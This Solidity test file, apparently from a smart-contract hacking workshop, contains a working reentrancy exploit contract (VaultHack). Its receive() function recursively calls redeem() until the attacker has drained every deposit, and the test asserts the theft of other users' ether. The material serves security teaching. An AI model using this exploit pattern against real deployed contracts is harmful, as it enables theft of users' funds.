//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "hack-workshop/SolidityHackingWorkshopV8.sol";

contract VaultHack {
    Vault vault;
    bool inRedeem = false;

    /// @dev Recursive call to redeem only
    receive() external payable {
        if (inRedeem) {
            redeem();
        }
    }

    constructor(address vaultAdr) {
        vault = Vault(vaultAdr);
    }

    function call_store() public payable {
        vault.store{value: msg.value}();
    }

    /// @dev specify inRedeem to recursive loop
    function redeem() public {
        inRedeem = true;
        vault.redeem();
    }
}

contract VaultTest is Test {
    address alice;
    address bob;
    Vault vault;
    VaultHack hack;

    function setUp() public {
        vault = new Vault();
        hack = new VaultHack(address(vault));
        alice = address(7777);
        bob = address(8888);
        payable(alice).transfer(1 ether);
        payable(bob).transfer(1 ether);
    }

    function testReentrancyVaultStore1Get3Ethers() public {
        assertEq(alice.balance, 1 ether);
        assertEq(bob.balance, 1 ether);

        vm.prank(alice);
        vault.store{value: 1 ether}();

        vm.prank(bob);
        vault.store{value: 1 ether}();

        hack.call_store{value: 1 ether}();
        assertEq(alice.balance, 0);
        assertEq(bob.balance, 0);
        assertEq(address(hack).balance, 0);
        assertEq(address(vault).balance, 3 ether);

        hack.redeem();
        assertEq(address(hack).balance, 3 ether);
    }
}
